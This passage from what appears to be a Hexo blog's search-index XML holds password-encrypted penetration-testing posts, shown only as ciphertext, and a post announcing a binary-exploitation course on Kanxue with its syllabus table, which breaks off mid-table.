d719bcce285930b8497400eaff600566011bd5c31ddacebc9b15e854c2a1d18a966437b101d2648dea9e3a39013bea9118b55e26e3aeae1e602357cba12fa01587f16c25a3ce5ee50e5c7a5ad100dabb7f10f08e45bd5617189903e6aaab7dbbd91c3adcde6b06a7c61b6de7301a7a38de561ca139da450b3161dc0e25c18592b695227e82fa0c16d4a3e61d02a2818297473e600c41a1db79f6125d766f82da6d4e6f2b864bd293a659843b6643829b1facc65156a22f8ddd5615f4b6dbd20d35ecf8f577792789d1e024c0da6f116e3872d40fd56358c82cb2899ee0d1836bad0536f28bdf449c541d58e2cf858305d22cd1ac9fa82f5836fcbf71e60da806dc31a546537f968d2a1f578d21e3f06bbb53c7587f3cc41a4cb957f4480aad9649ecbce9509002ac9cd5cfcd9877bba1df78a63c817aa9cbc1772b87d8ff859769654f1e66ca9986b0759c44d16cb72458adba582e0704bd5bcb3e190f55675a3e92fbe52950954c0bbe96123e4d5796f1538030244ac9bd4f461d7b0347d8480ebeb1fbd3d91b409d518a491624e849046d04f245aaa1713cb36a41f39e41da13bb612accb9eb06fa7a666ea7f0c322ae62962ecb35b30af36e9fb3fa5c97830412b1b6611fc3576e93a1b65d39b26759e2530cfd5b563cf5b40647d28cbc650d3b9ded9aeb21faa3551d69bc17fa167cd8adc576685320ebba8da67da30e7439eb15583d63d1bca4df3b1dcb5e1e2a32d11b1e2a8072813cfa90216cba60aad2184963e9bdc9b12aaf3e2c7330023b6ec55b55ea49428990f585a5491d4ca19d00d3530742d24f37b966052d1856fef51cf4cdaa4dffc9f36709fb115bb8d9fde644f0a2a9c261e1829281a880e2cb9434e02cfb57495c5262413149b0ae9195235768309d9d652f91108be021de5c4f665d4cea88b7ce96307018f2de3266fbc269e21b21921c218ce783c8cc40e59d2b47825f33140749b2e5e28bffee63247243b83ae2b1dbc794869444d5090c6093af10ec8db3d8f815706742d8f4e4374fbba44619f546c8d0ef3eb36fa96eb7dbb10bc187d645f9dd10a7ef8e0f82abf60b44fc543f27b4d8a7079eaad6ec6d31ba9e54c05195208bfd67820da29f90a520a70caf97fc6242bd4f6bc6523c0957edab4cce569430b3cceeca19d28156e115b796c31cab155894201acb7013ec7551ce5cfaff713320d2c0336893842aa8180c76b66ed73026f13fcabb20944b1bac87762dbc38fa34be34cbee55cdf13f919b905ca674190b43cf594e2949c906d0383e4abde4ecf16f9e0a1a470c291d116d3ffa6d1590f40abc41038cb7c274dec1a016c1c5a713999bc8bcf49e37f22be022b2504fe5ac59431422f86e6fc4867cbcda6085c0aab61fed564e2e19ab2dec0c68ec358c349b0cee45d67b16e798a08e5783baae0f79da08695491b5127ac390fbaaf8b3f21ad0e566ed4ac7b4d26328698843d62622f152685e5eab0424831894f4e36cdd9be84374f49a51458f74609eb10119d64d45e1b1970844f73c42c0a8fc58fac4118238942c3f957ca3ce6dd1a594b110294b7732b548ac1f19d5520c2856467286204ced241b05c54dc605ec032398892a76c00d27f1babef8bcd68b516e3c297dae1bf6d73231644e33ce6aab71b69c73f8e70389f6751d956e5624665086cab0572e3c05216a6786c490abb1157be8904853b97a69560a5c723eaa5ccf270cef3293f8758e2b1196e9c99441977de9c6c445dce15ef48593350ea267d33d6785b211fb7109aeae0b592b7628bb2c7366ce8644c6a757c0677207ffe43e5bce0d5731069775689f1e374723f4bb21ca9a51a9934a775fd04c1378e0f710e6ebb316554bc191a3af2edc08bc246e5f25a0b96e157632afabeb4548e949dfb37fb858728bdb823760e5840cbffdc1fca218d1ce70e2f22ce5d45aba41b6260ffb4b479af7b1b478baba836a3181d160f3f29f8cbe7f4884e22f785ee4ddc9a6477c93b56d22ab574ca671bfe264dc687a1243a38b66fc7bec5acd1b0361501239189ff0267a5080e222c5a809fb90ac2ed6d8317148fcce1f2f0996dcfaf7e969f84c9c6367364dd9d8d199595662862d258adff2a703ad90bf648c241791865782391e76e7b11566f233c5cd753fcc83f4f658652dc9f566167d18d0d049958efc25b236e8fa0c7de61f0709cae6c244d4148d46a949a8f7cc5bcf9e4098d6f0cc8c52716b4ea8cc747f1a5a5f81693a6a1cc36fd8a86850c858a63e6df54a74904e8e8f8198b10ea70ca961f7dd90f49e53b539068f59f6715cacdcd49bcb8f4466e0d1687e3dc11fd2f9ef816f0b2457f43a7242473d039f631af38855100b82aad86e786083e1c3e8f4b2c021128a5946cd40c1a53824fb3643446cde0bfcd40e4e1e4de34ed60b328bef0df48591a395141da58fe72c529fc6460e9bc864908481fd909669e2ed236c7978e3ab45a7164cebad47feec34d7ea03840956104c62de28cb58c37e028b4f04ab5bcf3ab9b4fe83757b09dc08bd34d9a7f9cd1daa0dac56980e504c07806e9aa238e1dcd894238e186ef60d9cbe3847dfc4903b2465e1fde2786e0fd7c759b1fff731ba8f7d8ce6571ca31056fc9ad4cc431cc39aaf831a5655104a1cc2a371e080efb926fb3fcd485cf04ec619e8a23ee99469f2f0f76dc33d539e845a3f9dc88f9dc83a594b4cb2c1661cf0401801c194ea1502475ff334e1c30d715ce8424de6235d9e2b0ced4e48781ce72ec6ab4cc41bef46657be21200664809e403183ae644fa1465a5d30649f20f3f1de94acde571956b421bd64775761caa4ddcb9e589cfd0e4df4d7548637f1cfddf5c1d279a0f7175fa90824b02a97eeeeb46fb9bf9fde41b7072604eca6030a6ffb4d92271bf4032f217889337ea78dec5a6b12a7e4a295c53efccc2976db9eea50d135e4fa1356bcad0f489d6beb491455c18694f0631b25aa8277858652f0ec209bfcd59050d3c621db1e1179fbf82032570f9143ef3c33f0ad4673d5ce5c0af9eebc305a06b3f4d3eedf5d9fa6a46507f8fc40ea7224702154ef60cadfd564f76fb71acfb7ce31e0f5fde14c722d81d6e591b694843d3f5240e16d53b4c5a75dad4dcad5e1e95f1896b5cea32942c6def6fd856db828e3e0b6924aad3b3ce648ab3c7ccebd3f677b062564b42715a35e46eb8b1d941e27c8231d3fd6f77adc0eaec1a2cf680a1514425ae69f2ebbde7171d6a728c13e01f7b9567ee1fd6856bd3cdd1e9c8570a491ede00e850d6acdbf1b82fb45c0831d5729b816d38e60d713b2775c9d26baaf24e0b9ba19df0a7b6a4d008ffd068f726da700e4fda40e36ec98656f819e210707dbfa0617425e76cf5a8e25f1b1536af207318f25ca6695e26d3c717e4cde0bf4773deea485f87d6ca08c5a947833619f0da96a51933ad7b2123ec9c0b9786124dd27eb79b6f41e5fbb471edc678d5f99147a4d5964bcf3bbd5314ecef03a544976c636ce369d52894f1902acf8a30be184923fbde610e7dbcf992451a80ae8d1ada002db282a923803cf8555c97ae3bfa540eb616f5e24951ea4cd0e4d1ad3da8e0d0407e9c9743382ddb6c073f6a12b8434090ceba434b9a0f5caf946c5926ef32c33ba70fed1ab572f6dea2936b91925719e0409809dea0d11c80523e5534c61fcd9f03fab30493b28b17724c2e90120d89a268c443e2c5f238bb9c5277ef6a07278b010a8a2db1c536b35b3cc2d3dda0a3d9c04e3a9efb88afbb999921550c4b24dee88adf7676e4b627d16477f14c99be8b47c8fe7b80fc6f9a7bf1daf54292559fdc95704a60df83ecba4009616be4f373c3f45f1315d393599f6587a9f0e47ff3ad8f2d3fc3bab1526b26942297689d67cd2441d135a653146382e3d40dd1d2ec3ba32e44dd8e5e2311287d59f4ceaf167398241af7b240a060f6e651676ad3b96fd8badf17e79507ec67809536a145baa07810f7d2d5289b3b9c0860d72be2029b986aa5bd38792c79f3f2217223938a3effb85271bc99ebd5ddd759ffed50f619a0bca1d7d7f6f601bc65aea43a5de1814c53d1b6230cf9f213bf01741d385970483e81909dac0ebe4b89cdd7b7322027f9a02b2404611116f8113eb5c563a2d639e38fa5b33a755ffd50df1dcf821a1a7cdfa57453332f7773902aa971267433134ddd7483c1073edb625123419115718b7caf16e2d8e050f5a91478e00d13b457d2f55e1534d8e3f02f2167d9b2afae4561c5f0701c385380d72aac76db8611dd958128264eaf8b5f487f65d450586ae546c71a74c0aee175d43503246f2aaf3823e2e638f0edc9e2b4600770456a1184db2fbda68452abb491abe52e8e006764719a6770133d144c141d65414e9551831b24afaccfa22c8d9f072bb7a33264ee4d0f235f67524a4dcc65d08c8f231ec70d3bb274bef7b8923637d2ddab92b76f0190b6f6eaea6891cce4c426a6feba182b19ff140dadfe7ef926ae06f857c20ddd6bbc2c030d1da91674e7012585786440997c3d452cbb2066f6cf9d4a2f24327037a5bea26e589bf90f7fe9049cbf15db53b6b1686b68ee2aa1107a7d9158780716537d6f76aa277d474c421bb028f9a5707e6337b428ae156a023bce7f899c48d62c4f0f4f8e32e33a26e04c5f46d9c7989e4f620e8b403a0dd445a57bc5533502af35ab13f305e0474cc12969f3d07281a9f9409459170b50e00023f5002ce56268f71f49d6a004cd82c800d201f807bf83c60c64b2a25f48b6d0fd319423dcd1b691a12f775e01d17783250801e043bdd8aad4d3863a3804703c33b773943981757ec3cb1598857228cad1ef45ac063d22a623605f557dfa1ba3182600e4091a84987ac7276721aba460086dcfcf07210adeb2d7431f5643c04f5e61a1058af127af4544f52afe39918c113c06a31e7c875d316571379a395c032cfe29fe5aad670c2d8a3a94b7a05cc586caadb6ac7a9d4a7936a0d02d50e9230fa7f8a3ddddaed987d2a1c3979d717a374a68745d5b23bfd9552814e8595c95c3e0c8fb55bad7cda76217a2ec7732c1ccd261b34c6d97f310f00e0f806deaa2db7f54cbfabfba1200cca946e544c4cdf64a0a6f78fb7c9a8a2884e594f9f6a0b7f707eb08d0805ab4087269ebc689a3ba701557a141a4f2dfb7141b9ff0a36420115a615dc2929021919ef668aafe67acf199c32025534ad139c36d788ffc10e3b8e46447d48a31b454e3a005e5d7960a59b6cd9f2ced83b63fbd93f47569bf2680432f9ce1f3caecb2506e7657db5c9c510968ea5c8a83ea364542902f57aedf6bf8c6d34b1a7099309ac07e96122a6c09f338ee1bb23ad5f5e382d26bf9afb6e91e090b56dfd12fad37cc6e819f014e1a30b1f462efb6de6fb655f0f6acc77278934be373bbf66daa2c1dab8cff60dde91440eaaa35409928eea830c2979b8cf1d93dba880439f3b1aae3c78b689c0fea7b8a409d9a73fe91dfc3e01fa0c7560b9e6009e6a7ac5efe8700601881c9c5069f7bc217ea9624691e52b4bd9f08567444fd4c5ba49be2c25aeeca37ac50936b1b05c3b00c328cd1337ade0814785fa4a342615c07109e4dbdab27e4753109f111c634644b542a908ef08e84d0161f610163c382b76be2fb01c58ae010d399d6a89d8e54a64ae0b6cdd2ed424b9abe1b99d7dfc8d5ba2c30f64952f835d82b6a6f7f9c8da4c789c9b8fcb52cdbf825b2800b2a92f7ae225c6f83f08c3754eaf589acd1bbbd9bc53281d83aa749c960cd538fd54561cc7d0757984b8806c55f53cf6f7cfcdd79bf66fdd01cacede5451aefa04cd043d35d8d8a4d</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-swup-reload-script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透手札之免杀与远控</title>
    <url>/2024/01/19/%E6%B8%97%E9%80%8F%E6%89%8B%E6%9C%AD%E4%B9%8B%E5%85%8D%E6%9D%80%E4%B8%8E%E8%BF%9C%E6%8E%A7/</url>
    <content><![CDATA[
<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="3666f1d2c1472efb73b4884d99c57196982db90bc1ca819b05fe02370b65afc2">2d806215ddc7c4fd1f6babc1a9ab678d6b15992746f26bfdbdf0a2f49fb26f638361c17213401908fbeb23857ecd098de56efcc36475facd61f1da0408ae3a132329ce4bfd7be47e4e545753ebfdcec910692ed68261648280ff42c1f65ebfa7</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-swup-reload-script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>免杀与远控</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机科学中的数学</title>
    <url>/2023/10/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B8%AD%E7%9A%84%E6%95%B0%E5%AD%A6/</url>
    <content><![CDATA[
<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="fe8cc9e8e651bf10bdee690168d10acac9993d74dcd4c5262dc9763cc6c56acc">2d806215ddc7c4fd1f6babc1a9ab678d5631f1876bfd11d63fd6ecbf724f9357</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-swup-reload-script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Math</category>
      </categories>
      <tags>
        <tag>math</tag>
      </tags>
  </entry>
  <entry>
    <title>课程上架看雪学苑</title>
    <url>/2024/01/19/%E8%AF%BE%E7%A8%8B%E4%B8%8A%E6%9E%B6%E7%9C%8B%E9%9B%AA%E5%AD%A6%E8%8B%91/</url>
    <content><![CDATA[<h1 id="课程目录"><a href="#课程目录" class="headerlink" title="课程目录"></a>课程目录</h1><p>**历时良久，精心制作的课程上架看雪学苑了!!! **课程分为四部分，目录好多都包含了很多内容，写的简短些，比如<code>kernel pwn</code>的利用该和<code>heap</code>以及<code>IO_FILE</code>的利用等。目前<a class="link"   href="https://www.kanxue.com/book-leaflet-172.htm" >第一部分 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>已上线看雪学苑，主打一个硬核，并且未来还会在此课程中继续更新其他内容！</p>
<h2 id="Linux-pwn-探索篇"><a href="#Linux-pwn-探索篇" class="headerlink" title="Linux pwn 探索篇"></a>Linux pwn 探索篇</h2><p><a class="link"   href="https://www.kanxue.com/book-leaflet-172.htm" >课程链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<table>
<thead>
<tr>
<th><strong>linux user pwn 基础篇</strong></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>课程介绍</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>课程简介</td>
</tr>
<tr>
<td></td>
<td></td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>课程目录</td>
</tr>
<tr>
<td></td>
<td></td>
<td>学习建议</td>
</tr>
<tr>
<td>2</td>
<td>环境搭建</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>环境搭建</td>
</tr>
<tr>
<td></td>
<td></td>
<td>环境搭建</td>
</tr>
<tr>
<td></td>
<td></td>
<td>环境搭建</td>
</tr>
<tr>
<td></td>
<td></td>
<td>环境搭建</td>
</tr>
<tr>
<td>3</td>
<td>二进制基础上</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>ELF文件</td>
</tr>
<tr>
<td></td>
<td></td>
<td>编译过程</td>
</tr>
<tr>
<td></td>
<td></td>
<td>链接</td>
</tr>
<tr>
<td></td>
<td></td>
<td>加载</td>
</tr>
<tr>
<td>4</td>
<td>二进制基础下</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>共享库</td>
</tr>
<tr>
<td></td>
<td></td>
<td>多线程与TLS</td>
</tr>
<tr>
<td></td>
<td></td>
<td>常见保护</td>
</tr>
<tr>
<td></td>
<td></td>
<td>调用约定</td>
</tr>
<tr>
<td><strong>linux user pwn 栈篇</strong></td>
<td></td>
<td></td>
</tr>
<tr>
<td>1</td>
<td>栈上的逻辑漏洞</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>原理</td>
</tr>
<tr>
<td></td>
<td></td>
<td>x32示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>x64示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>作业</td>
</tr>
<tr>
<td>2</td>
<td>ret2text</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>原理</td>
</tr>
<tr>
<td></td>
<td></td>
<td>x32示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>x64示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>作业</td>
</tr>
<tr>
<td>3</td>
<td>ret2shellcode</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>原理</td>
</tr>
<tr>
<td></td>
<td></td>
<td>x32示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>x64示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>作业</td>
</tr>
<tr>
<td>4</td>
<td>ret2syscall</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>原理</td>
</tr>
<tr>
<td></td>
<td></td>
<td>x32示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>x64示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>作业</td>
</tr>
<tr>
<td>5</td>
<td>ret2libc</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>原理</td>
</tr>
<tr>
<td></td>
<td></td>
<td>x32示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>x64示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>作业</td>
</tr>
<tr>
<td>6</td>
<td>ret2libc</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>原理</td>
</tr>
<tr>
<td></td>
<td></td>
<td>x32示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>x64示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>作业</td>
</tr>
<tr>
<td>7</td>
<td>stack_pivoting</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>原理</td>
</tr>
<tr>
<td></td>
<td></td>
<td>x32示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>x64示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>作业</td>
</tr>
<tr>
<td>8</td>
<td>ret2csu</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>原理</td>
</tr>
<tr>
<td></td>
<td></td>
<td>x64示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>例题</td>
</tr>
<tr>
<td></td>
<td></td>
<td>作业</td>
</tr>
<tr>
<td>9</td>
<td>ret2dl-resolve</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>原理</td>
</tr>
<tr>
<td></td>
<td></td>
<td>x32示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>x64示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>作业</td>
</tr>
<tr>
<td>10</td>
<td>ret2vDSO</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>原理</td>
</tr>
<tr>
<td></td>
<td></td>
<td>示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>作业</td>
</tr>
<tr>
<td>11</td>
<td>SROP</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>原理</td>
</tr>
<tr>
<td></td>
<td></td>
<td>示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>作业</td>
</tr>
<tr>
<td>12</td>
<td>BROP</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>原理</td>
</tr>
<tr>
<td></td>
<td></td>
<td>示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>作业</td>
</tr>
<tr>
<td>13</td>
<td>沙箱及其绕过</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>原理</td>
</tr>
<tr>
<td></td>
<td></td>
<td>示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>作业</td>
</tr>
<tr>
<td>13</td>
<td>侧信道攻击</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>原理</td>
</tr>
<tr>
<td></td>
<td></td>
<td>示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>作业</td>
</tr>
<tr>
<td>14</td>
<td>stack_protector_bypass</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>原理</td>
</tr>
<tr>
<td></td>
<td></td>
<td>示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>作业</td>
</tr>
<tr>
<td>15</td>
<td>格式化字符串漏洞</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>原理</td>
</tr>
<tr>
<td></td>
<td></td>
<td>示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>示例</td>
</tr>
<tr>
<td></td>
<td></td>
<td>作业</td>
</tr>
<tr>
<td><strong>linux user pwn 堆篇</strong></td>
<td></td>
<td></td>
</tr>
<tr>
<td>1</td>
<td>堆基础</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>堆基本操作</td>
</tr>
<tr>
<td></td>
<td></td>
<td>相关数据结构</td>
</tr>
<tr>
<td>2</td>
<td>堆基础</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>堆分配关键过程</td>
</tr>
<tr>
<td></td>
<td></td>
<td>源码解读</td>
</tr>
<tr>
<td>3</td>
<td>堆利用（持续更新）</td>
<td>这个部分将会持续更新，堆利用手法太多。包括how2heap全系列的讲解以及新的利用手段，每个手法都会单出视频进行原理和例题的解析</td>
</tr>
<tr>
<td><strong>linux user pwn IO_FILE篇</strong></td>
<td></td>
<td></td>
</tr>
<tr>
<td>1</td>
<td>IO_FILE基础</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>IO_FILE简介</td>
</tr>
<tr>
<td></td>
<td></td>
<td>相关数据结构</td>
</tr>
<tr>
<td>2</td>
<td>IO_FILE基础</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>基础利用手法</td>
</tr>
<tr>
<td></td>
<td></td>
<td>例题解析</td>
</tr>
<tr>
<td>3</td>
<td>IO_FILE利用（持续更新）</td>
<td>这个部分和堆篇一样持续更新，手法太多，讲解一些新老利用手法，每个手法单独出一个视频，原理和例题解析</td>
</tr>
</tbody></table>
<h2 id="Linux-pwn-精进篇"><a href="#Linux-pwn-精进篇" class="headerlink" title="Linux pwn 精进篇"></a>Linux pwn 精进篇</h2><table>
<thead>
<tr>
<th><strong>linux user pwn LLVM PASS PWN篇</strong></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>LLVM PASS PWN基础</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>LLVM</td>
</tr>
<tr>
<td></td>
<td></td>
<td>LLVM IR</td>
</tr>
<tr>
<td></td>
<td></td>
<td>LLVM PASS</td>
</tr>
<tr>
<td>2</td>
<td>LLVM PASS PWN解析</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>例题解析</td>
</tr>
<tr>
<td></td>
<td></td>
<td>作业</td>
</tr>
<tr>
<td><strong>linux user pwn 异构篇</strong></td>
<td></td>
<td></td>
</tr>
<tr>
<td>1</td>
<td>ARM PWN</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>语言基础</td>
</tr>
<tr>
<td></td>
<td></td>
<td>调试解析</td>
</tr>
<tr>
<td></td>
<td></td>
<td>例题解析</td>
</tr>
<tr>
<td></td>
<td></td>
<td>作业</td>
</tr>
<tr>
<td>2</td>
<td>AARCH64 PWN</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>语言基础</td>
</tr>
<tr>
<td></td>
<td></td>
<td>调试解析</td>
</tr>
<tr>
<td></td>
<td></td>
<td>例题解析</td>
</tr>
<tr>
<td></td>
<td></td>
<td>作业</td>
</tr>
<tr>
<td>3</td>
<td>MIPS PWN</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>语言基础</td>
</tr>
<tr>
<td></td>
<td></td>
<td>调试解析</td>
</tr>
<tr>
<td></td>
<td></td>
<td>例题解析</td>
</tr>
<tr>
<td></td>
<td></td>
<td>作业</td>
</tr>
<tr>
<td>4</td>
<td>PowerPC PWN</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>语言基础</td>
</tr>
<tr>
<td></td>
<td></td>
<td>调试解析</td>
</tr>
<tr>
<td></td>
<td></td>
<td>例题解析</td>
</tr>
<tr>
<td></td>
<td></td>
<td>作业</td>
</tr>
<tr>
<td><strong>linux user pwn musl pwn篇</strong></td>
<td></td>
<td></td>
</tr>
<tr>
<td>1</td>
<td>musl pwn 基础</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>环境搭建</td>
</tr>
<tr>
<td></td>
<td></td>
<td>基本数据结构</td>
</tr>
<tr>
<td></td>
<td></td>
<td>函数分析</td>
</tr>
<tr>
<td>2</td>
<td>musl-1.2.0 pwn 堆利用</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>基础讲解</td>
</tr>
<tr>
<td></td>
<td></td>
<td>例题解析</td>
</tr>
<tr>
<td>3</td>
<td>musl-1.2.3 pwn 堆利用</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>基础讲解</td>
</tr>
<tr>
<td></td>
<td></td>
<td>例题解析</td>
</tr>
<tr>
<td>4</td>
<td>musl pwn IO_FILE 利用</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>基础讲解</td>
</tr>
<tr>
<td></td>
<td></td>
<td>例题解析</td>
</tr>
<tr>
<td><strong>linux kernel pwn 基础篇</strong></td>
<td></td>
<td></td>
</tr>
<tr>
<td>1</td>
<td>kernel pwn 基础</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>内核基础知识讲解</td>
</tr>
<tr>
<td>2</td>
<td>kernel pwn 基础</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>内核内存管理</td>
</tr>
<tr>
<td></td>
<td></td>
<td>内核保护机制</td>
</tr>
<tr>
<td>3</td>
<td>kernel pwn 基础</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>内核环境搭建</td>
</tr>
<tr>
<td>4</td>
<td>kernel pwn 基础</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>linux内核模块开发</td>
</tr>
<tr>
<td><strong>linux kernel pwn 利用篇</strong></td>
<td></td>
<td></td>
</tr>
<tr>
<td>1</td>
<td>kernel pwn 利用</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>Kernel stack buffer oveflow</td>
</tr>
<tr>
<td>2</td>
<td>kernel pwn 利用</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>kernel Heap Expliot</td>
</tr>
<tr>
<td>3</td>
<td>kernel pwn 利用</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>Race condition</td>
</tr>
<tr>
<td>4</td>
<td>kernel pwn 利用</td>
<td>kernel 常用结构体利用，这个部分持续更新一些 kernel 的新老利用手法</td>
</tr>
</tbody></table>
<h2 id="Windows-pwn-篇"><a href="#Windows-pwn-篇" class="headerlink" title="Windows pwn 篇"></a>Windows pwn 篇</h2><table>
<thead>
<tr>
<th>windows user pwn 基础篇</th>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>win pwn 基础</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>环境搭建</td>
</tr>
<tr>
<td>2</td>
<td>win pwn 基础</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>函数调用约定</td>
</tr>
<tr>
<td></td>
<td></td>
<td>PE格式</td>
</tr>
<tr>
<td>3</td>
<td>win pwn 基础</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>函数调用约定</td>
</tr>
<tr>
<td></td>
<td></td>
<td>PE格式及常见地址泄露方法</td>
</tr>
<tr>
<td>4</td>
<td>win pwn 基础</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>windows 异常处理</td>
</tr>
<tr>
<td></td>
<td></td>
<td>windows IO_FILE</td>
</tr>
<tr>
<td>5</td>
<td>win pwn 基础</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
<td>windows 异常处理</td>
</tr>
<tr>
<td></td>
<td></td>
<td>windows IO_FILE</td>
</tr>
<tr>
<td>6</td>
<td>win pwn 基础</td>
<td>课程目标</td>
</tr>
<tr>
<td></td>
<td></td>
